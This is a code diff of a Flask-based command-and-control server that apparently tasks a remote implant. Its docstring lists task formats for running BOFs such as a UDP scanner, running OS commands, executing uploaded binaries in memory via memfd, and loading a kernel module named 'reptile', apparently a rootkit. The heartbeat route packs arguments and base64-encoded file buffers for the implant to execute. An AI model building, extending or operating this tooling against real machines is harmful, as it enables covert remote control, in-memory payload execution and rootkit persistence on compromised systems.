@@ -13,18 +13,40 @@ app = Flask(__name__)
 bofsRootDir = "/bofs/"
 
 """
-Structure of tasks:
+Structure of tasks (running simple BOF):
 cmdData0 = {
-	"header" : "thread:zb",
-	"argv" : "8.8.8.8:53",
-	"buffer" : "file:udpPayloads.txt",
-	"name" : "bof:udpScanner",
+	"header" : "inline:z",
+	"name" : "bof:uname",
+	"argv" : "-r",
 };
 
+Structure of tasks (running BOF and passing the buffer content to it):
 cmdData1 = {
+	"header" : "thread:zb",
+	"name" : "bof:udpScanner",
+	"argv" : "8.8.8.8:53",
+	"buffer" : "file:udpPayloads.txt",
+};
+
+Structure of tasks (running OS commands):
+cmdData2 = {
 	"header" : "inline:z",
-	"argv" : "-r",
-	"name" : "bof:uname",
+	"name" : "cmd:ls",
+	"argv" : "-al",
+};
+
+Structure of tasks (running shellcodes):
+cmdData3 = {
+	"header" : "inline:b",
+	"name" : "bin:memfdExecute",
+	"buffer" : "file:executableToUpload.exe",
+};
+
+Structure of tasks (running kernel modules):
+cmdData4 = {
+	"header" : "inline:z",
+	"name" : "mod:reptile",
+	"argv" : "start",
 };
 """
 
@@ -37,38 +59,6 @@ TaskFifo = deque()
 # stored under reqID keys 
 InputDict = dict()
 OutputDict = dict()
-
-# borrowed from https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py
-class BeaconPack:
-    def __init__(self):
-        self.buffer = b''
-        self.size = 0
-
-    def getbuffer(self):
-        return pack("<L", self.size) + self.buffer
-
-    def addshort(self, short):
-        self.buffer += pack("<h", short)
-        self.size += 2
-
-    def addint(self, dint):
-        self.buffer += pack("<i", dint)
-        self.size += 4
-
-    def addstr(self, s):
-        if isinstance(s, str):
-            s = s.encode("utf-8")
-        fmt = "<L{}s".format(len(s) + 1)
-        self.buffer += pack(fmt, len(s)+1, s)
-        self.size += calcsize(fmt)
-
-    def addWstr(self, s):
-        if isinstance(s, str):
-            s = s.encode("utf-16_le")
-        fmt = "<L{}s".format(len(s) + 2)
-        self.buffer += pack(fmt, len(s)+2, s)
-        self.size += calcsize(fmt)
-
 
 @app.route("/")
 def main_page():
@@ -136,6 +126,12 @@ def heartbeat():
     # get tasking data from TaskFifo and prepare for processing it
     data = TaskFifo.pop()
     cmdData = json.loads(data) # deserialize to JSON
+
+    # check for required fields (name, header, id)
+    if cmdData['name'] == "" or cmdData['header'] == "" or cmdData['id'] == "":
+        return "say what?"
+
+    # request ID for identifying requests (task input data) with responses (tasks output)
     reqID = cmdData['id']
 
     # store task's input data for logging purposes
@@ -151,7 +147,7 @@ def heartbeat():
     # 1. prepare path/URI for the BOF in case when downloading it will be needed
     # 2. calculate requested BOF's hash
     # 3. add bof_hash to the header field
-    # 4. if 'persist' is in the header, put it at the end
+    # 4. if 'persist' is in the header, put it at the last field of the header
     if 'bof:' in cmdData['name']:
         # prepare instruction's: 'path' field for bofs
         _, name = cmdData['name'].split(':')
@@ -172,41 +168,66 @@ def heartbeat():
             # append hash to the header:
             Instruction['header'] = header + ":" + bof_hash
 
+    # get args specification possible values: iszZb
     args_spec = header.split(':')[1]
 
-    # check if args_spec from header contains a buffer ("b"):
-    for c in args_spec:
-        # buffer in 'header'
-        if c == 'b':
-            if 'file:' in cmdData['buffer']:
-                _, path = cmdData['buffer'].split(':')
+    # skip further processing with no arguments were provided
+    if args_spec == "":
+        return Instruction 
+
+    if 'argv' not in cmdData:
+        return Instruction 
+
+    # prepare cmdData/Instruction for BOF-stager by iterating over 'argv' and inspecting args_spec
+    argv = cmdData['argv'].split(' ')
+    new_argv = ""
+    i = 0
+    buf_number = 0
+
+    if len(argv) != len(args_spec):
+        print("argv and args_spec mismatched length!")
+
+    while i < len(argv):
+        print(argv[i])
+        print(args_spec[i])
+        
+        if len(new_argv) > 0:
+            new_argv += " "
+
+        # zero-terminated string
+        if args_spec[i] == 'z':
+            argv[i] = "z:" + argv[i]
+            new_argv += argv[i]
+        # integer
+        elif args_spec[i] == 'i':
+            argv[i] = "i:" + argv[i]
+            new_argv += argv[i]
+        # short integer
+        elif args_spec[i] == 's':
+            argv[i] = "s:" + argv[i]
+            new_argv += argv[i]
+        elif args_spec[i] == 'b':
+            # prepare Instruction's field name
+            field_name = "buffer" + str(buf_number)
+            buf_number += 1
+ 
+            # prepare Instruction's field content
+            if 'file:' in argv[i]:
+                _, path = argv[i].split(':')
                 with open(path, 'rb') as f:
-                     Instruction['buffer'] = base64.b64encode(f.read()).decode('utf-8')
+                    Instruction[field_name] = base64.b64encode(f.read()).decode('utf-8')
             else:
-                Instruction['buffer'] = base64.b64encode(cmdData['buffer'])
-            # we're done, remove 'b' character
-            args_spec = args_spec.replace('b', '')
+                # field is expected to be already base64 encoded
+                Instruction[field_name] = argv[i]
 
+            new_argv += str(field_name)
 
-    if 'argv' in cmdData:
-        ArgsPack = BeaconPack()
+        i += 1
 
-        # build 'args' by parsing 'argv' and inspecting args_spec:
-        # possible values in 'header': iszZ
-        arg_list = cmdData['argv'].split(' ')
-        i = 0
-        while i < len(arg_list):
-            if args_spec[i] == 'z':
-                ArgsPack.addstr(arg_list[i])
-            elif args_spec[i] == 'Z':
-                ArgsPack.addWstr(arg_list[i])
-            elif args_spec[i] == 's':
-                ArgsPack.addshort(arg_list[i])
-            elif args_spec[i] == 'i':
-                ArgsPack.addint(arg_list[i])
-            i += 1
-        Instruction['args'] = base64.b64encode(ArgsPack.getbuffer()).decode('utf-8')
-        #TODO: in implant allocate buffer if present and add to bof_args
+    print("new_argv: " + new_argv)
+
+    # glue together all argv[i]'s and base64 encode it before sending
+    Instruction['argv'] = base64.b64encode(new_argv.encode('utf-8')).decode('utf-8')
 
     # return Implant's Instruction for execution
     return Instruction 
